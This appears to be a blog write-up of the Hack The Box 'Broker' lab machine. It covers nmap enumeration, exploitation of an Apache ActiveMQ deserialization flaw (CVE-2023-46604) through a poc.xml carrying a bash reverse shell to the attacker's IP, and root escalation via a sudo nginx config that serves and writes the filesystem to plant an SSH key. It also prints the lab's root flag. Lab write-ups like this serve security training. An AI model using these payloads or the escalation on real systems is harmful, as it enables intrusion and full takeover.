---
title:  "HTB Broker Writeup"
date:   2024-01-21 00:30:00 
categories: HTB Machine
tags: CVE_Exploit Sudo-nginx
---

![](2024-01-22-21-03-03.png)


# Machine Info
Broker is an easy difficulty `Linux` machine hosting a version of `Apache ActiveMQ`. Enumerating the version of `Apache ActiveMQ` shows that it is vulnerable to `Unauthenticated Remote Code Execution`, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a `sudo` misconfiguration allowing the `activemq` user to execute `sudo /usr/sbin/nginx`, which is similar to the recent `Zimbra` disclosure and is leveraged to gain `root` access. 


## Enumeration 
Lets we start enum usually i scanning with nmap

```
rting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-22 08:22 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:22
Completed NSE at 08:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:22
Completed NSE at 08:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:22
Completed NSE at 08:22, 0.00s elapsed
Initiating Ping Scan at 08:22
Scanning broker.htb (10.10.11.243) [4 ports]
Completed Ping Scan at 08:22, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 08:22
Scanning broker.htb (10.10.11.243) [65535 ports]
Discovered open port 8888/tcp on 10.10.11.243
Discovered open port 80/tcp on 10.10.11.243
Discovered open port 22/tcp on 10.10.11.243
Discovered open port 36159/tcp on 10.10.11.243
Discovered open port 1337/tcp on 10.10.11.243
Discovered open port 1883/tcp on 10.10.11.243
Discovered open port 4096/tcp on 10.10.11.243
Discovered open port 61614/tcp on 10.10.11.243
Discovered open port 5672/tcp on 10.10.11.243
Discovered open port 61613/tcp on 10.10.11.243
Discovered open port 8161/tcp on 10.10.11.243
Discovered open port 61616/tcp on 10.10.11.243
```

Let's we check port 80 . I found login form and i filled it with default username password and success login

u:admin

p:admin

![](2024-01-22-21-24-15.png)

Broker website using `Apache ActiveMQ` . Usually Easy machine using CVE to exploit it . I found `Apache ActiveMQ` Exploit CVE github page here [CVE-2023-46604
](https://github.com/evkl1d/CVE-2023-46604)
.Now download the tools from github page was gave here.

# Run CVE Exploit 

To run the tools . First of all start with python webserver and run python script also running the netcat for revshell

python3 exploit.py -i http://broker.htb -p 80 -u 10.10.10.122:8000/poc.xml

file contains `poc.xml`

```                                                                                        
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.14.122/1337 0&gt;&amp;1</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

```
     _        _   _           __  __  ___        ____   ____ _____ 
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ 
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 10.10.11.243:61616
[*] XML URL: http://10.10.14.122/poc.xml

[*] Sending packet: 0000006e1f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e7465787401001b687474703a2f2f31302e31302e31342e3132322f706f632e786d6c
```

There send packet to my webserver python

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.243 - - [22/Jan/2024 23:39:24] "GET /poc.xml HTTP/1.1" 200 -
10.10.11.243 - - [22/Jan/2024 23:39:24] "GET /poc.xml HTTP/1.1" 200 -
```

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.122] from (UNKNOWN) [10.10.11.243] 60516
bash: cannot set terminal process group (884): Inappropriate ioctl for device
bash: no job control in this shell
activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
```
My revshell has been connected so now i'll do upgrade shell 



```
activemq@broker:/opt/apache-activemq-5.15.15/bin$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
activemq@broker:/opt/apache-activemq-5.15.15/bin$ ^Z
[1]+  Stopped                 nc -lnvp 9001
kali@kali$ stty raw -echo ; fg
nc -lnvp 9001
             reset
reset: unknown terminal type unknown
Terminal type? screen
activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
```

My revshell has been upgraded . Let's do privilege escalation to get root access


## Privilege Escalation

First of all we start with enumeration . Activemq user can run `nginx` as root without password . 

```
activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

## Create malicious nginx config file

[Nginx config example](https://www.nginx.com/resources/wiki/start/topics/examples/full/) here the config file example . `user` i will change to root for get root access .It must have an `events` to define the number of workers . `http` used for port listen 


## File Read only
```
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
```

```
activemq@broker:~$ sudo /usr/sbin/nginx -c /tmp/test.conf 
```
i'll running my webserver by sudo nginx with `-c` command to locate path config file and for get root access . Look at the below i got grab `root.txt` file but only can file read only . Let's add new config to got root access 


```
activemq@broker:/tmp$ curl localhost:1337/root/root.txt
a2a56d190a061d847b37c35f0d06bea5
```

To get root access we need append `PUT` in config file 

## File Write

I'll update the config file to enabling PUT

```
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1338;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```
We need change the port at listen because you can't running same port . I'll running again with sudo


```
activemq@broker:~$ sudo /usr/sbin/nginx -c /tmp/t.conf 
```

Now running curl command with -X PUT and add your public keys ssh because `PUT` function already added in config nginx so you can use put your files to webserver

```
curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYchILzjmmEm2qzhGj0ewpfGQMwfJC83jPMXj0aMOkfpOX/Myw7TbMqH9QvkuWnA+Yi1Jo3n34R865/64lkHXgYTVECH/T0M5Ng+L+BQwwsKwYg5y4nL4FpQV+uAP2eOxR96qBceSIkrGYoYuKzusN3zEkk3HDdvsLBf4b+CPk5GcalIScRcJJPzXcO6KORxqKgPLRoOpccEc4ymNmiQ/GgP0ATxqxDlWwmtLsVw2vF5U/Sw3YPeJ0ztVcoMDj6gEeynVlTVcvgzdrEhM5XKu4uiabbyQ4N201TbImdj1gXNYbcj9AlphhlKvH8Q3wFo8fkbVwj7bM/UcUOTGqHsPAm64nNHRhG8U47raMAt7O7DTlEKE9ZOi0q6Fz7rSZiMxdILBDqa3M6J7ayOg7FkM8DAv+Jey4RzFTEUOMDnrxAxYSbO6QorST6HPz62lMltStM9rMgtw+JdDvq5vVmMqz/nU7o+HjIHpQBAu7OmrGiv+mh7Hsrj76pgBlxFK0kcE= kali@kali'
```

I have uploaded my public key to webserver at user root now i can login ssh using my priv8 rsa and login as root broker

```
┌──(kali㉿kali)-[~/.ssh]
└─$ ssh root@broker.htb -i id_rsa  


root@broker:~# id
uid=0(root) gid=0(root) groups=0(root)
```

I have been rooted the machine by nginx config . I enjoyed the machine because i learned how to root using nginx config

